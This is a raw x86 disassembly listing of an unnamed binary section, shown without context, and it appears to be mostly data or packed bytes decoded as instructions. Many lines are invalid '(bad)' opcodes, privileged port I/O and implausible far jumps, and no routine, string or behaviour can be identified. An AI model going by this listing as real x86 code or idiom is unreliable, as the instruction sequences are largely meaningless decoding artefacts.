  405797:	idiv   WORD PTR [esi+0xde491b4]
  40579e:	add    BYTE PTR [eax],al
  4057a0:	je     0x4057b2
  4057a2:	stos   DWORD PTR es:[edi],eax
  4057a3:	imul   edi,DWORD PTR [ecx-0x6ba19d46],0x17
  4057aa:	xor    BYTE PTR [edi+0x58],dl
  4057ad:	fidiv  DWORD PTR [edi-0x6d2456e0]
  4057b3:	aas    
  4057b4:	and    ah,BYTE PTR [esi]
  4057b6:	repz jmp 0x405760
  4057b9:	dec    ebx
  4057ba:	scas   eax,DWORD PTR es:[edi]
  4057bb:	test   DWORD PTR [eax+eax*1],esp
  4057be:	add    BYTE PTR [esi+ecx*1-0x3bffff2a],dh
  4057c5:	loope  0x40583c
  4057c7:	add    BYTE PTR [eax],al
  4057c9:	gs icebp 
  4057cb:	(bad)
  4057ce:	pop    eax
  4057cf:	dec    ebp
  4057d0:	mov    ds:0x1cbd5cb9,eax
  4057d5:	mul    BYTE PTR [edx+0x2b]
  4057d8:	adc    ebp,DWORD PTR [esi-0x7b0a8964]
  4057de:	idiv   BYTE PTR ds:0x2c
  4057e4:	rol    BYTE PTR [edi+0x0],cl
  4057e7:	add    BYTE PTR [ebx+0x1f],bl
	...
  4057f6:	pop    ebp
  4057f7:	jnp    0x4057bb
  4057f9:	data16 cmp BYTE PTR [edi],al
  4057fc:	mov    dh,0x81
  4057fe:	jmp    0xd431:0x512f8491
  405805:	(bad)  
  405806:	retf   0x11b9
  405809:	adc    eax,edi
  40580b:	or     eax,0x7cff
  405810:	add    BYTE PTR [eax],al
  405812:	add    BYTE PTR [eax],al
  405814:	add    BYTE PTR [eax],al
  405816:	add    BYTE PTR [ebp-0x78a5be7b],al
  40581c:	xchg   esi,eax
  40581d:	test   DWORD PTR [ebp+0x7347db11],eax
  405823:	fs xchg esi,eax
  405825:	xchg   BYTE PTR ds:0xb553a9b9,bl
  40582b:	and    eax,0xe537b07a
  405830:	int3   
  405831:	inc    edi
  405832:	(bad)  
  405833:	(bad)  
  405834:	(bad)  
  405835:	pop    ecx
  405836:	add    BYTE PTR [ecx-0x2d],ch
  405839:	ror    esp,cl
  40583b:	dec    esp
  40583c:	mov    esi,0xb5d7d542
  405841:	mov    BYTE PTR [ebp-0x7ad40e7b],0x85
  405848:	daa    
  405849:	push   ss
  40584a:	xor    al,BYTE PTR [ebp-0x3a4caf73]
  405850:	jge    0x405873
  405852:	stos   DWORD PTR es:[edi],eax
  405853:	fbstp  TBYTE PTR [edi-0x1a3921f7]
  405859:	cwde   
  40585a:	xchg   ebx,eax
  40585b:	mov    ds:0x25e153cc,eax
  405860:	sub    eax,0x8f60ad46
  405865:	lea    ecx,[ebp-0xd7c8873]
  40586b:	and    BYTE PTR [edx+esi*4],al
  40586e:	mov    al,0xea
  405870:	push   cs
  405871:	sub    esp,DWORD PTR [ecx-0x4a]
  405874:	leave  
  405875:	mov    ebp,0x2d2aa669
  40587a:	lods   eax,DWORD PTR ds:[esi]
  40587b:	mov    DWORD PTR [ecx],eax
  40587d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40587e:	pop    edi
  40587f:	push   eax
  405880:	out    dx,eax
  405881:	pop    ecx
  405882:	jne    0x4058c8
  405884:	inc    ebx
  405885:	arpl   WORD PTR [esi+0x20],sp
  405888:	gs jae 0x4058f0
  40588b:	jae    0x4058ad
  40588d:	gs cs cmp al,0x20
  405891:	and    BYTE PTR [ecx+0x20],ah
  405894:	and    BYTE PTR [ebp+0x65],cl
  405897:	jae    0x405908
  405899:	jb     0x40590e
  40589b:	and    BYTE PTR [ebp+0x64],ah
  40589e:	inc    esp
  40589f:	push   ebx
  4058a0:	outs   dx,BYTE PTR ds:[esi]
  4058a1:	jo     0x405906
  4058a3:	jb     0x405912
  4058a5:	push   ebx
  4058a6:	gs gs ds gs jae 0x40590d
  4058ac:	dec    ebp
  4058ad:	je     0x405914
  4058af:	imul   esp,DWORD PTR [ecx+0x65],0x620d6d6d
  4058b6:	gs gs dec ebp
  4058b9:	outs   dx,DWORD PTR ds:[esi]
  4058ba:	jo     0x4058dc
  4058bc:	outs   dx,BYTE PTR ds:[esi]
  4058bd:	push   edi
  4058be:	imul   ebp,DWORD PTR [edi],0x436d656d
  4058c4:	sub    BYTE PTR [ebx+0x4d],dh
  4058c7:	arpl   WORD PTR ds:[ebp+0x20],sp
  4058cb:	and    BYTE PTR [eax+eiz*1+0x41],dh
  4058cf:	outs   dx,BYTE PTR ds:[esi]
  4058d0:	popa   
  4058d1:	dec    esp
  4058d2:	ins    DWORD PTR es:[edi],dx
  4058d3:	popa   
  4058d4:	and    BYTE PTR [ebp+0x69],ch
  4058d7:	arpl   WORD PTR [edx+0x3c],si
  4058da:	popa   
  4058db:	ins    DWORD PTR es:[edi],dx
  4058dc:	and    BYTE PTR [bp+di+0x53],ah
  4058e0:	arpl   WORD PTR [ecx+eiz*2+0x70],ax
  4058e4:	ins    DWORD PTR es:[edi],dx
  4058e5:	and    ah,BYTE PTR [ebx+0x3a]
  4058e8:	or     eax,0x65696563
  4058ed:	and    BYTE PTR [esi+0x65],ch
  4058f0:	bound  esi,QWORD PTR [edx-0x2f]
  4058f3:	pop    ds
  4058f4:	inc    ebp
  4058f5:	lea    ecx,[ebp-0x7229c5b1]
  4058fb:	lea    ecx,[ebp+0x0]
  405901:	add    BYTE PTR [eax],al
  405903:	add    BYTE PTR [eax],al
  405905:	add    al,bh
  405907:	cmp    eax,0x8d8d8dd7
  40590c:	lea    ecx,[ebp-0x72727273]
  405912:	(bad)  
  405913:	call   DWORD PTR [eax+esi*1]
  405916:	push   ecx
  405917:	inc    esi
  405918:	inc    ecx
  405919:	adc    ecx,edx
  40591b:	ffreep st(2)
  40591d:	sahf   
  40591e:	jl     0x40598b
  405920:	pop    ss
  405921:	in     eax,dx
  405922:	or     eax,0x392ebaab
  405927:	jae    0x405951
  405929:	sub    ebp,DWORD PTR [esi+0x7b]
  40592c:	(bad)  
  40592d:	call   DWORD PTR [eax+0x74]
  405930:	(bad)  
  405931:	push   DWORD PTR [esi-0x400000c7]
  405937:	outs   dx,DWORD PTR ds:[esi]
  405938:	add    ebp,DWORD PTR [esi+ebp*1+0x47]
  40593c:	mov    esi,0x2b83aab7
  405941:	(bad)  
  405942:	scas   al,BYTE PTR es:[edi]
  405943:	repz ss mov dl,0xdc
  405947:	loope  0x4058ed
  405949:	push   edx
  40594a:	pop    es
  40594b:	fcmove st,st(5)
  40594d:	scas   eax,DWORD PTR es:[edi]
  40594e:	inc    DWORD PTR [eax]
  405950:	stos   DWORD PTR es:[edi],eax
  405951:	outs   dx,BYTE PTR ds:[esi]
  405952:	jb     0x4059b3
  405954:	add    BYTE PTR [eax],al
  405956:	add    BYTE PTR [esi+0x7d],bl
  405959:	jmp    0x67946c98
  40595e:	dec    ebx
  40595f:	cmc    
  405960:	dec    eax
  405961:	mov    ?,WORD PTR [eax-0x65]
  405964:	repnz mov dl,0x54
  405967:	jnp    0x40596c
  405969:	dec    ecx
  40596a:	add    al,cl
  40596c:	inc    edi
  40596d:	loop   0x40592f
  40596f:	loope  0x4059d0
  405971:	jecxz  0x4059d6
  405973:	daa    
  405974:	and    eax,DWORD PTR [ecx+edx*2+0x13]
  405978:	outs   dx,BYTE PTR ds:[esi]
  405979:	mov    ah,0x0
  40597b:	add    BYTE PTR [edx],ah
  40597d:	iret   
  40597e:	add    BYTE PTR [eax],al
  405980:	add    BYTE PTR [ebx-0x74747475],cl
  405986:	mov    ecx,DWORD PTR [ebx+0x70de8b8b]
  40598c:	xchg   edi,eax
  40598d:	(bad)  
  40598e:	(bad)  
  40598f:	(bad)  
  405990:	(bad)  
  405991:	(bad)  
  405992:	(bad)  
  405993:	(bad)  
  405994:	(bad)  
  405995:	psubsb mm5,mm0
  405998:	jnp    0x4059d5
  40599a:	data16 (bad) 
  40599c:	jp     0x405943
  40599e:	push   eax
  40599f:	cmp    ch,BYTE PTR [eax]
  4059a1:	repz xchg ecx,eax
  4059a3:	push   cs
  4059a4:	rcl    DWORD PTR [edx+0x76],cl
  4059a7:	leave  
  4059a8:	mov    edi,0x16231206
  4059ad:	mov    bh,0xb6
  4059af:	dec    ebx
  4059b0:	call   0x5f04e69d
  4059b5:	cmp    eax,0x4acbd19b
  4059ba:	xor    eax,0xa655bafe
  4059bf:	das    
  4059c0:	in     eax,dx
  4059c1:	mov    cl,0xeb
  4059c3:	pop    eax
  4059c4:	pop    esp
  4059c5:	das    
  4059c6:	add    al,0x84
  4059c8:	call   DWORD PTR [ecx+0x53]
  4059cb:	add    DWORD PTR [edi-0x171752ab],ebp
  4059d1:	add    eax,0xe8e8ed09
  4059d6:	mov    cl,0x5a
  4059d8:	cld    
  4059d9:	call   0x5b1686de
  4059de:	cmp    edx,esp
  4059e0:	into   
  4059e1:	dec    edx
  4059e2:	push   eax
  4059e3:	or     eax,0x28a70a16
  4059e8:	adc    eax,0xeb156950
  4059ed:	(bad)  [ebx]
  4059ef:	xchg   ebp,eax
  4059f0:	lods   eax,DWORD PTR ds:[esi]
  4059f1:	arpl   WORD PTR [eax+eax*1+0x0],ax
  4059f5:	add    BYTE PTR [ecx],bh
  4059f7:	daa    
  4059f8:	add    BYTE PTR [eax],al
  4059fa:	mul    dh
	...
  405a08:	arpl   sp,dx
  405a0a:	(bad)
  405a0e:	les    eax,FWORD PTR ds:0x2fd80859
  405a14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a16:	sbb    BYTE PTR [edi+eax*4],al
  405a19:	lods   eax,DWORD PTR ds:[esi]
  405a1a:	jns    0x40599f
  405a1c:	outs   dx,DWORD PTR ds:[esi]
  405a1d:	loop   0x4059ad
  405a1f:	cmp    eax,ebp
  405a21:	call   0xe929430e
  405a26:	call   0x33744313
  405a2b:	push   0x33bf4bcf
  405a30:	xor    esi,DWORD PTR [ebp+0x5ff0fd66]
  405a36:	sbb    ah,BYTE PTR [edx]
  405a38:	les    eax,FWORD PTR [ebx]
  405a3a:	in     al,0x30
  405a3c:	push   eax
  405a3d:	pushf  
  405a3e:	push   ds
  405a3f:	cdq    
  405a40:	push   ss
  405a41:	add    edx,DWORD PTR [esi]
  405a43:	add    DWORD PTR [edx-0x9],ebx
  405a46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a47:	mov    ebx,0x67d33a7c
  405a4c:	retf   
  405a4d:	or     eax,0x3c3d770b
  405a52:	or     al,BYTE PTR [ebx+0x57f73333]
  405a58:	xor    esi,DWORD PTR [ebx]
  405a5a:	icebp  
  405a5b:	cmp    bl,ch
  405a5d:	xor    eax,DWORD PTR [eax]
  405a5f:	and    DWORD PTR [ecx],0xcb4bf912
  405a65:	xchg   esi,eax
  405a66:	mov    al,ds:0x675a7449
  405a6b:	adc    al,0xd0
  405a6d:	add    BYTE PTR [edx-0x8e170c2],al
  405a73:	into   
  405a74:	js     0x405adf
  405a76:	sahf   
  405a77:	add    BYTE PTR [eax],al
  405a79:	add    al,bh
  405a7b:	cmp    ebp,DWORD PTR ds:0xa16d7521
  405a81:	adc    al,BYTE PTR [ecx-0x6000b91d]
  405a87:	pusha  
  405a88:	inc    esp
  405a89:	loope  0x405a83
  405a8b:	enter  0xce61,0xaf
  405a8f:	mov    esp,0x7fc8f35
  405a94:	lods   eax,DWORD PTR ds:[esi]
  405a95:	pop    esp
  405a96:	sub    eax,DWORD PTR [eax]
  405a98:	add    BYTE PTR [ecx+ebx*1+0x49],ch
  405a9c:	add    BYTE PTR [eax],al
  405a9e:	add    bh,bh
  405aa0:	(bad)  
  405aa1:	(bad)  
  405aa2:	(bad)  
  405aa3:	(bad)  
  405aa4:	(bad)  
  405aa5:	(bad)  
  405aa6:	(bad)  
  405aa7:	(bad)  
  405aa8:	cmp    eax,0xffff5dcb
  405aad:	(bad)  
  405aae:	(bad)  
  405aaf:	(bad)  
  405ab0:	(bad)  
  405ab1:	(bad)  
  405ab2:	(bad)  
  405ab3:	(bad)  
  405ab4:	(bad)  
  405ab5:	call   esp
  405ab7:	push   0x51926c43
  405abc:	push   edx
  405abd:	push   ecx
  405abe:	scas   eax,DWORD PTR es:[edi]
  405abf:	and    ebx,ebx
  405ac1:	push   esp
  405ac2:	imul   ecx,DWORD PTR [ebp+0x5055114b],0xa8e9876c
  405acc:	dec    ebx
  405acd:	cmp    bh,0xff
  405ad0:	cdq    
  405ad1:	cs (bad) 
  405ad3:	(bad)  
  405ad4:	fiadd  DWORD PTR [edi+edi*8]
  405ad7:	inc    DWORD PTR [ecx+0x72]
  405ada:	add    al,dl
  405adc:	jle    0x405ad6
  405ade:	inc    edi
  405adf:	lea    ecx,[eax-0x76]
  405ae2:	mov    DWORD PTR [ebx],edx
  405ae4:	call   0x9838bf6a
  405ae9:	mov    bl,0xa0
  405aeb:	add    ecx,ebx
  405aed:	rol    DWORD PTR [edx+0x30],0xff
  405af1:	je     0x405afa
  405af3:	fcom   QWORD PTR [ecx+0x4]
  405af6:	je     0x405b6c
  405af8:	je     0x405b6f
  405afa:	outs   dx,BYTE PTR ds:[esi]
  405afb:	mov    edx,0x8a6c524f
  405b00:	push   esi
  405b01:	jle    0x405adb
  405b03:	dec    edi
  405b04:	mov    al,0x50
  405b06:	mov    ebx,0xd6ae6d2
  405b0b:	sbb    DWORD PTR [edx],ebp
  405b0d:	push   esp
  405b0e:	scas   al,BYTE PTR es:[edi]
  405b0f:	sub    esp,DWORD PTR ds:0xd2e9a0bd
  405b15:	mov    ecx,0x58e4386
  405b1a:	xor    ebx,ecx
  405b1c:	je     0x405b92
  405b1e:	ds daa 
  405b20:	je     0x405b96
  405b22:	je     0x405b69
  405b24:	inc    ebp
  405b25:	inc    ebp
  405b26:	inc    ebp
  405b27:	inc    ebp
  405b28:	inc    ebp
  405b29:	inc    ebp
  405b2a:	inc    ebp
  405b2b:	inc    ebp
  405b2c:	lock pop esi
  405b2e:	lds    eax,FWORD PTR [esp+eax*1]
  405b31:	add    al,0x4
  405b33:	add    al,0x4
  405b35:	add    al,0x4
  405b37:	add    al,0x8b
  405b39:	mov    ebp,ebx
  405b3b:	xchg   edi,eax
  405b3c:	ins    BYTE PTR es:[edi],dx
  405b3d:	neg    BYTE PTR [ebx]
  405b3f:	out    0x91,al
  405b41:	or     esp,edx
  405b43:	add    edx,DWORD PTR [ebx+eax*1-0x6f6430b7]
  405b4a:	(bad)  
  405b4b:	out    0xe0,al
  405b4d:	pushf  
  405b4e:	call   0x8bdb4f2d
  405b53:	mov    eax,DWORD PTR [ebx+0x73]
  405b56:	cmp    eax,0xce992e87
  405b5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b5c:	sub    BYTE PTR [eax+edi*1+0x4b07df80],0x79
  405b64:	shl    DWORD PTR fs:[eax-0x22],1
  405b68:	stos   DWORD PTR es:[edi],eax
  405b69:	and    eax,0x7d9d63ff
  405b6e:	or     DWORD PTR [eax],eax
  405b70:	pop    eax
  405b71:	mov    ecx,DWORD PTR [ebx-0x744c942f]
  405b77:	mov    ebp,DWORD PTR [edi+0x458b1fe3]
  405b7d:	out    dx,al
  405b7e:	pop    esi
  405b7f:	sub    BYTE PTR [ebp-0x50],al
  405b82:	adc    BYTE PTR [esi-0x6b],0x94
  405b86:	ror    BYTE PTR [eax-0x72],cl
  405b89:	fidiv  WORD PTR [edi+esi*4-0x5175bfe3]
  405b90:	shl    DWORD PTR ds:0x45ebeab8,cl
  405b96:	inc    ebp
  405b97:	inc    ebp
  405b98:	std    
  405b99:	or     BYTE PTR [ebp+0x45],al
  405b9c:	gs push edi
  405b9e:	inc    ebp
  405b9f:	inc    ebp
  405ba0:	inc    ebp
	...
  405ba9:	add    dh,dl
  405bab:	cmp    al,0x8c
  405bad:	xor    DWORD PTR [edi],esi
  405baf:	lods   al,BYTE PTR ds:[esi]
  405bb0:	clc    
  405bb1:	rcr    DWORD PTR [ebp-0x3b],1
  405bb4:	dec    eax
  405bb5:	not    BYTE PTR [ebx+esi*2-0x36acb0cf]
  405bbc:	fwait
  405bbd:	in     eax,0xdf
  405bbf:	dec    eax
  405bc0:	jnp    0x405c19
	...
  405bca:	add    BYTE PTR [esp],ah
  405bcd:	adc    BYTE PTR [edi+0x2424444a],bh
  405bd3:	push   esp
  405bd4:	jnp    0x405bda
  405bd6:	fsubr  DWORD PTR [ecx+0x2d]
  405bd9:	mov    eax,ecx
  405bdb:	xor    bh,dl
  405bdd:	shl    DWORD PTR [ebp+0x61],cl
  405be0:	add    al,0x35
  405be2:	mov    ecx,0xadf5b4a
  405be7:	gs jmp 0xbad88999
  405bed:	and    DWORD PTR [eax-0x45],edi
  405bf0:	push   ds
  405bf1:	cmovno esi,DWORD PTR [ebx]
  405bf4:	mov    esp,0xc82424eb
  405bf9:	daa    
  405bfa:	and    al,0x24
  405bfc:	sub    dl,BYTE PTR [ecx]
  405bfe:	outs   dx,BYTE PTR ds:[esi]
  405bff:	and    al,0x85
  405c01:	adc    BYTE PTR [edx-0x734c1c4],bl
  405c07:	shr    BYTE PTR [edi+0x6a],1
  405c0a:	sub    al,BYTE PTR ds:0x71da20f4
  405c10:	out    dx,al
  405c11:	shr    BYTE PTR [eax-0x1c],1
  405c14:	out    dx,al
  405c15:	data16 int3 
  405c17:	(bad)  
  405c18:	pop    ebx
  405c19:	test   DWORD PTR [ebp+0x596f4285],eax
  405c1f:	popa   
  405c20:	or     bl,BYTE PTR ds:0x814bc26b
  405c26:	pop    ss
  405c27:	xchg   esp,eax
  405c28:	sahf   
  405c29:	fisub  WORD PTR [ebx-0x510a0215]
  405c2f:	push   ebx
  405c30:	outs   dx,BYTE PTR ds:[esi]
  405c31:	bound  esi,QWORD PTR [eax+0x6f]
  405c34:	and    BYTE PTR [ebx+0x74],ah
  405c37:	gs or  eax,0x704d6553
  405c3d:	cs cmp eax,0xa206573
  405c43:	cs gs dec ebp
  405c46:	and    BYTE PTR [ecx+0x77],ah
  405c49:	gs je  0x405cb1
  405c4c:	push   edi
  405c4d:	ds inc esp
  405c4f:	jae    0x405c9e
  405c51:	cmp    eax,0xd3c6861
  405c56:	jb     0x405cc6
  405c58:	and    BYTE PTR [edi+0x70],ch
  405c5b:	cs ins DWORD PTR es:[edi],dx
  405c5d:	gs jb  0x405cc9
  405c60:	push   ebx
  405c61:	push   ebx
  405c62:	outs   dx,DWORD PTR ds:[esi]
  405c63:	ins    DWORD PTR es:[edi],dx
  405c64:	or     ah,BYTE PTR [ebp+0x6d]
  405c67:	ins    DWORD PTR es:[edi],dx
  405c68:	ins    DWORD PTR es:[edi],dx
  405c69:	and    BYTE PTR [edx+0x20],dh
  405c6c:	dec    ebp
  405c6d:	and    BYTE PTR [ecx+eiz*2+0x6d],dh
  405c71:	outs   dx,BYTE PTR ds:[esi]
  405c72:	jo     0x405cdd
  405c74:	ins    DWORD PTR es:[edi],dx
  405c75:	bound  ebp,QWORD PTR gs:[ebp+0x64]
  405c79:	inc    esp
  405c7a:	or     ah,BYTE PTR [edx+0x65]
  405c7d:	inc    esp
  405c7e:	gs sub al,0x62
  405c81:	jo     0x405ce8
  405c83:	je     0x405cd8
  405c85:	and    BYTE PTR [eax+edx*2+0x6d],dh
  405c89:	push   edi
  405c8a:	jb     0x405cf1
  405c8c:	gs jne 0x405caf
  405c8f:	bound  esp,QWORD PTR ds:[esi+0x22]
  405c93:	je     0x405ccd
  405c95:	or     eax,0x8ef2f173
  405c9a:	adc    BYTE PTR [esi-0x2],0xbb
  405c9e:	test   DWORD PTR [ebp-0x7aa09c83],eax
  405ca4:	test   DWORD PTR [ebp+0x0],eax
  405caa:	add    BYTE PTR [eax],al
  405cac:	add    BYTE PTR [eax],al
  405cae:	add    BYTE PTR [esi],bl
  405cb0:	mov    dl,0x51
  405cb2:	jne    0x405d29
  405cb4:	jne    0x405d2b
  405cb6:	jne    0x405d2d
  405cb8:	jne    0x405d2f
  405cba:	jne    0x405c45
  405cbc:	mov    DWORD PTR [edi],ecx
  405cbe:	inc    eax
  405cbf:	out    dx,eax
  405cc0:	push   ebx
  405cc1:	push   edx
  405cc2:	dec    esi
  405cc3:	outs   dx,DWORD PTR ds:[esi]
  405cc4:	jno    0x405d36
  405cc6:	cmp    BYTE PTR ds:0x7a9bee78,0x69
  405ccd:	imul   esp,DWORD PTR [eax+0x17],0x38
  405cd1:	jle    0x405d1c
  405cd3:	sti    
  405cd4:	push   ecx
  405cd5:	mov    DWORD PTR [ecx-0x76767a08],ecx
  405cdb:	mov    ebx,0x96898944
  405ce0:	retf   0x6818
  405ce3:	call   0x896fa91a
  405ce8:	pusha  
  405ce9:	mov    al,0xcb
  405ceb:	mov    bl,0xac
  405ced:	push   edx
  405cee:	daa    
  405cef:	sub    al,0x67
  405cf1:	inc    esp
  405cf2:	sub    BYTE PTR [ecx+0x8],dl
  405cf5:	inc    DWORD PTR [ecx+0x482de889]
  405cfb:	jb     0x405d3c
  405cfd:	call   0x653145ea
  405d02:	dec    ebp
  405d03:	sbb    eax,0xcd30c693
  405d08:	sti    
  405d09:	xor    eax,0x5d6a9705
  405d0e:	inc    edi
  405d0f:	bound  edi,QWORD PTR [ecx]
  405d11:	sti    
  405d12:	clc    
  405d13:	(bad)  
  405d14:	loopne 0x405c9c
  405d16:	mov    ch,0x44
  405d18:	cmp    DWORD PTR [ebx-0x1593bf28],0xffffffe3
  405d1f:	pop    ds
  405d20:	inc    eax
  405d21:	loope  0x405cd9
  405d23:	call   0xe8a7bd10
  405d28:	call   0xe9294615
  405d2d:	call   0xe929461a
  405d32:	call   0xcca7526
  405d37:	or     al,0xc
  405d39:	or     al,0xc
  405d3b:	or     al,0xc
  405d3d:	or     al,0xc
  405d3f:	or     al,0xc
  405d41:	fsub   st(2),st
  405d43:	mov    cl,0xc6
  405d45:	cmp    BYTE PTR [ebx-0x6],0xb5
  405d49:	jbe    0x405cf6
  405d4b:	scas   al,BYTE PTR es:[edi]
  405d4c:	mov    al,ds:0xb75a023d
  405d51:	int3   
  405d52:	pop    edx
  405d53:	sub    eax,eax
  405d55:	loopne 0x405dd0
  405d57:	adc    ah,BYTE PTR [edx+0xc]
  405d5a:	or     al,0x63
  405d5c:	push   edi
  405d5d:	add    eax,0x8ab06639
  405d62:	lea    esi,ds:0x7812de50
  405d68:	std    
  405d69:	test   ebx,ebp
  405d6b:	fs push 0xfcad030f
  405d71:	sar    BYTE PTR [ebp+0x7],0xed
  405d75:	jb     0x405ddd
  405d77:	cmp    al,0xc
  405d79:	or     al,0xff
  405d7b:	cmp    al,0x56
  405d7d:	or     al,0xc
  405d7f:	inc    BYTE PTR [edx-0x4776f304]
  405d85:	adc    cl,ch
  405d87:	cmp    edx,DWORD PTR [ecx]
  405d89:	loopne 0x405e06
  405d8b:	add    DWORD PTR [ebp+0x6],0x40ff134c
  405d92:	mov    ds:0x2e147377,al
  405d97:	hlt    
  405d98:	shr    ecx,cl
  405d9a:	jmp    0x405d60
  405d9c:	mov    DWORD PTR [ecx-0x76bdf277],ecx
  405da2:	mov    DWORD PTR [eax+0x1c],ebx
  405da5:	mov    DWORD PTR [ecx+0x89],ecx
  405dab:	add    BYTE PTR [eax],al
  405dad:	add    BYTE PTR [eax],al
  405daf:	add    BYTE PTR [eax],al
  405db1:	xor    al,0x3a
  405db3:	daa    
  405db4:	inc    esp
  405db5:	sahf   
  405db6:	aaa    
  405db7:	rcr    dl,0x33
  405dba:	ret    0x6057
  405dbd:	pop    edi
  405dbe:	call   0x983b84e4
  405dc3:	mov    esi,0xb649e50a
  405dc8:	xchg   esi,eax
	...
  405dd1:	add    BYTE PTR [edx+0x6a],ch
  405dd4:	mov    edi,0x6a7d1436
  405dd9:	push   0xfffffff2
  405ddb:	ins    BYTE PTR es:[edi],dx
  405ddc:	(bad)  
  405ddd:	call   0x483f:0xc6696441
  405de4:	icebp  
  405de5:	(bad)  
  405de6:	dec    esi
  405de7:	or     BYTE PTR [ecx+0x5824532a],bh
  405ded:	imul   eax,DWORD PTR [edi+0x5],0xc27a4f07
  405df4:	ror    BYTE PTR [ebp+0x742ba7c3],0x74
  405dfb:	in     eax,dx
  405dfc:	inc    ecx
  405dfd:	push   0x6a
  405dff:	push   0xffffffb1
  405e01:	push   0x6a
  405e03:	dec    ebp
  405e04:	and    ecx,ecx
  405e06:	push   0x0
  405e08:	push   cs
  405e09:	jo     0x405e76
  405e0b:	outs   dx,WORD PTR ds:[esi]
  405e0d:	sbb    eax,ebx
  405e0f:	(bad)  
  405e10:	in     al,dx
  405e11:	imul   ebx,DWORD PTR es:[ebx],0xfde80e7
  405e18:	ret    
  405e19:	fs or  bl,cl
  405e1c:	(bad)  
  405e1d:	loope  0x405dc0
  405e1f:	test   BYTE PTR [eax],al
  405e21:	add    BYTE PTR [eax],al
  405e23:	out    dx,al
  405e24:	(bad)  
  405e25:	scas   al,BYTE PTR es:[edi]
  405e26:	aad    0xf7
  405e28:	fild   WORD PTR [esi+0x76]
  405e2b:	mov    WORD PTR [eax+ebx*2-0x62],fs
  405e2f:	imul   ebp,DWORD PTR [esi],0x38a4bae2
  405e35:	pop    eax
  405e36:	push   esp
  405e37:	cmp    eax,0xd06d4443
  405e3c:	push   esi
  405e3d:	shl    BYTE PTR [esi-0x7b],1
  405e40:	add    BYTE PTR [eax],al
  405e42:	int    0xd6
  405e44:	adc    eax,0x0
	...
  405e51:	or     dh,BYTE PTR [edi-0x7474748f]
  405e57:	mov    ecx,DWORD PTR [ebx-0x74747475]
  405e5d:	add    BYTE PTR [eax],al
  405e5f:	mov    ah,0xf7
  405e61:	bound  esp,QWORD PTR [esi+0x127b8c09]
  405e67:	xchg   BYTE PTR [esi-0x76],cl
  405e6a:	push   ebp
  405e6b:	pop    esp
  405e6c:	je     0x405df0
  405e6e:	jno    0x405ea0
  405e70:	mov    al,0x63
  405e72:	shl    BYTE PTR [eax],1
  405e74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e75:	aaa    
  405e76:	stos   DWORD PTR es:[edi],eax
  405e77:	add    BYTE PTR [eax],al
  405e79:	sub    edx,eax
  405e7b:	add    BYTE PTR [eax],al
  405e7d:	jno    0x405eab
  405e7f:	add    BYTE PTR [eax],al
  405e81:	call   0x7771aea7
  405e86:	inc    eax
  405e87:	daa    
  405e88:	ds cwde 
  405e8a:	or     DWORD PTR [eax+0x57],esp
  405e8d:	mov    al,ds:0x2261a945
  405e92:	test   esi,ebp
  405e94:	xchg   DWORD PTR [ebx+0x2dccbc],ecx
  405e9a:	add    BYTE PTR [esi+0x85bbc4],cl
  405ea0:	add    BYTE PTR [eax],al
  405ea2:	fldcw  WORD PTR [ebp+ecx*8+0xa]
  405ea6:	cmc    
  405ea7:	mov    ch,0x9
  405ea9:	jnp    0x405ed9
  405eab:	lea    esi,[eax+eiz*1-0x68]
  405eaf:	(bad)  
  405eb2:	out    0xf2,al
  405eb4:	fwait
  405eb5:	jge    0x405e45
  405eb7:	mov    eax,0x660ae988
  405ebc:	sbb    DWORD PTR [edx+0x7e],edi
  405ebf:	popa   
  405ec0:	jnp    0x405e99
  405ec2:	jnp    0x405ed3
  405ec4:	mov    ds:0xe8540000,eax
  405ec9:	add    BYTE PTR [eax],al
  405ecb:	add    bh,bh
  405ecd:	(bad)  
  405ece:	(bad)  
  405ecf:	(bad)  
  405ed0:	(bad)  
  405ed1:	(bad)  
  405ed2:	(bad)  
  405ed3:	(bad)  
  405ed4:	call   DWORD PTR [edx+0x7620]
	...
  405ee2:	add    BYTE PTR [esi+0x7b],bl
  405ee5:	jmp    0x1753:0xcc96c2f2
  405eec:	or     al,0x2a
  405eee:	dec    eax
  405eef:	jge    0x405eac
  405ef1:	mov    dh,0x67
  405ef3:	int    0x31
  405ef5:	jmp    ecx
  405ef7:	add    BYTE PTR [ebx+0xbd88],cl
  405efd:	cmp    eax,0x4932304c
  405f02:	mov    eax,DWORD PTR [edx-0x7e]
  405f05:	out    dx,ax
  405f07:	jnp    0x405ea2
  405f09:	(bad)  
  405f0a:	rcl    DWORD PTR [esp+edi*8+0x1c15a374],1
  405f11:	adc    ch,cl
  405f13:	loope  0x405f07
  405f15:	pop    ss
  405f16:	xor    edi,esp
  405f18:	mov    al,ds:0x7800007a
  405f1d:	jnp    0x405f60
  405f1f:	add    BYTE PTR [eax],al
  405f21:	lods   eax,DWORD PTR ds:[esi]
  405f22:	sbb    ebp,esi
  405f24:	add    BYTE PTR [ebx-0x584d0ed5],cl
  405f2a:	std    
  405f2b:	out    dx,eax
  405f2c:	xchg   ebp,eax
  405f2d:	jo     0x405eee
  405f2f:	push   ebp
  405f30:	sub    eax,0x2b92aa9d
  405f35:	fist   DWORD PTR [edx+0x2c2b598a]
  405f3b:	inc    eax
  405f3c:	fiadd  WORD PTR [eax]
  405f3e:	mov    ecx,DWORD PTR [ebx-0x74b4bd75]
  405f44:	mov    eax,DWORD PTR [ebx]
  405f46:	jmp    0xffff:0xff8b8b8b
  405f4d:	(bad)  
  405f4e:	(bad)  
  405f4f:	(bad)  
  405f50:	(bad)  
  405f51:	(bad)  
  405f52:	(bad)  
  405f53:	in     eax,dx
  405f54:	nop
  405f55:	jno    0x405f55
  405f57:	xor    eax,0x621165b1
  405f5c:	aaa    
  405f5d:	ret    
  405f5e:	cli    
  405f5f:	and    al,0x7
  405f61:	add    dl,BYTE PTR [ebx+0x432a65ed]
  405f67:	mov    edx,0x8b73d86a
  405f6c:	mov    ecx,DWORD PTR [ebx-0x74747475]
  405f72:	mov    ecx,DWORD PTR [ebx+0x12470404]
  405f78:	cli    
  405f79:	bound  eax,QWORD PTR [esp+eax*1]
  405f7c:	leave  
  405f7d:	sub    al,0x46
  405f7f:	dec    esi
  405f80:	mov    bh,0x56
